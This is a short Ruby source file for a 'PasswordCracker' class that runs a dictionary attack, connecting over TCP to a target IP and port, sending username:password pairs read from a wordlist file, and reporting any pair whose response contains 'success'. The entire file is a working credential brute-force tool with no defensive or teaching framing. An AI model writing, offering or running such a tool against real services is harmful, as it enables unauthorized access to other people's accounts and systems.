require 'socket'

class PasswordCracker
  def attempt_login(ip, port, username, password)
    socket = TCPSocket.new(ip, port)
    socket.puts("#{username}:#{password}")
    
    response = socket.gets
    socket.close

    response && response.include?('success')
  rescue
    false
  end

  def dictionary_attack(ip, port, username, password_file)
    puts "Starting dictionary attack on #{username}@#{ip}:#{port}"
    File.readlines(password_file).each do |line|
      password = line.strip
      if attempt_login(ip, port, username, password)
        puts "Found valid credentials: #{username}:#{password}"
        return
      end
    end
    puts "No valid credentials found."
  end
end
